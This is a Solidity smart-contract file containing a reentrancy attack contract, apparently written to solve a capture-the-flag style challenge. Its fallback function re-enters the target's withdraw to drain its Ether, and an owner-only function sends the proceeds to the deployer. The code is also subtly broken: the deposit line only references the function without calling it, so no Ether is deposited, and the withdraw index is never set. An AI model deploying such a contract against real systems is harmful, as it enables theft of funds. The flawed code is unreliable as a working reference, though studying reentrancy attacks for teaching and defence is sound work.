// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IReentrance {
    function deposit() external payable;
    function withdraw(uint256 _index) external;
}

contract ReentranceAttack {
    address public owner;
    IReentrance targetContract;
    uint targetValue = 1000000000000000000;
    uint256 index;
    constructor(address _targetAddr) public {
        targetContract = IReentrance(_targetAddr);
        owner = msg.sender;
    }

    function balance() public view returns (uint) {
        return address(this).balance;
    }

    function donateAndWithdraw(uint256 _indexing) public payable {
        require(msg.value >= targetValue);
        // targetContract.deposit.value(msg.value)(address(this));
        targetContract.deposit;
        targetContract.withdraw(_indexing);
    }

    function withdrawAll() public returns (bool) {
        require(msg.sender == owner, "my money!!");
        uint totalBalance = address(this).balance;
        (bool sent, ) = msg.sender.call.value(totalBalance)("");
        require(sent, "Failed to send Ether");
        return sent;
    }

    receive() external payable {
        uint targetBalance = address(targetContract).balance;
        if (targetBalance >= targetValue) {
          targetContract.withdraw(index);
        }
    }
}

